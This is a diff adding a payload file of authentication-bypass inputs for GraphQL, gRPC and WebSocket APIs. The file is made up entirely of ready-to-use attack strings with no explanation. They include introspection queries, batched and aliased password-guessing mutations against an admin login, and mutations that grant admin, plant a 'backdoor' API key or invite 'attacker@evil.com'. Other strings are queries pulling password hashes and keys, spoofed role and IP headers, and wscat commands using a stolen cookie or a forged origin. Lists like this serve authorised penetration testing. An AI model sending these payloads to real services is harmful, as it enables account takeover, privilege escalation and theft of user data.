@@ -1,0 +1,55 @@
+# GraphQL, gRPC & WebSocket Auth Bypass Payloads
+
+## GraphQL Introspection Queries
+{"query":"{ __schema { types { name fields { name type { name } } } } }"}
+{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}
+{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}
+{"query":"{ __type(name: \"Query\") { fields { name args { name type { name } } } } }"}
+{"query":"{ __type(name: \"Mutation\") { fields { name args { name type { name } } } } }"}
+
+## GraphQL Batching (Array of Queries)
+[{"query":"mutation{login(email:\"admin@target.com\",password:\"pass1\"){token}}"},{"query":"mutation{login(email:\"admin@target.com\",password:\"pass2\"){token}}"},{"query":"mutation{login(email:\"admin@target.com\",password:\"pass3\"){token}}"}]
+
+## GraphQL Aliasing (Multiple Operations in One Query)
+query { a1:login(email:"admin@target.com",password:"pass1"){token} a2:login(email:"admin@target.com",password:"pass2"){token} a3:login(email:"admin@target.com",password:"pass3"){token} }
+
+## GraphQL Admin Mutations
+mutation { updateUserRole(userId:"1",role:"admin") { id role } }
+mutation { deleteUser(id:"1") { success } }
+mutation { createApiKey(name:"backdoor") { key } }
+mutation { resetPassword(email:"admin@target.com") { success } }
+mutation { inviteUser(email:"attacker@evil.com",role:"admin") { success } }
+
+## GraphQL Nested Auth Bypass
+{ users { id email role adminPanel { secrets } } }
+{ user(id:1) { posts { author { role email passwordHash } } } }
+{ organization { members { user { apiKeys { key } } } } }
+
+## gRPC Reflection Commands
+grpcurl -plaintext target:50051 list
+grpcurl -plaintext target:50051 describe
+grpcurl -plaintext target:50051 describe service.AdminService
+grpcurl -plaintext target:50051 service.AdminService/ListUsers
+
+## gRPC Auth Metadata
+authorization: Bearer invalid
+x-forwarded-for: 127.0.0.1
+x-user-role: admin
+x-user-id: 1
+x-internal-request: true
+
+## WebSocket Auth Tests
+# Connect without auth
+wscat -c "wss://target.com/ws"
+# Connect with stolen cookie
+wscat -c "wss://target.com/ws" -H "Cookie: session=stolen"
+# CSWSH - connect with wrong origin
+wscat -c "wss://target.com/ws" --origin "https://evil.com"
+
+## WebSocket Admin Messages
+{"action":"admin.listUsers"}
+{"action":"admin.deleteUser","userId":"1"}
+{"action":"admin.updateRole","userId":"1","role":"admin"}
+{"action":"admin.getConfig"}
+{"action":"admin.exportData"}
+{"type":"subscribe","channel":"admin-events"}
